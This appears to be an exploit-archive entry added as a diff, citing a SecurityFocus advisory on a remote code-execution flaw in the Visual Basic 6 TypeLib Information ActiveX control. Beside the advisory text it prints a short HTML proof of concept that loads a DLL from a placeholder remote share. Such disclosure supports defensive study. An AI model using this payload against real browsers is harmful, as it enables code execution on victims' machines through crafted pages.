@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/25289/info
+
+The Microsoft Visual Basic 6 TypeLib Information Library (TLI) ActiveX control is prone to a remote code-execution vulnerability.
+
+An attacker may exploit this issue by enticing victims into opening a maliciously crafted HTML document.
+
+Successfully exploiting this issue allows remote attackers to execute arbitrary code in the context of the application using the ActiveX control (typically Internet Explorer). Failed exploit attempts will likely result in denial-of-service conditions. 
+
+<object width=1000 height=20 classid="CLSID:<CLASSID>"
+name=test></object>
+x= test.TypeLibInfoFromFile("\\\\IPADDRESS\\SHARE\\remote.dll")
+' Call the remote DLLGetDocumentation function
+alert(x.Interfaces.Item(a).Members.Item(b).HelpString) 
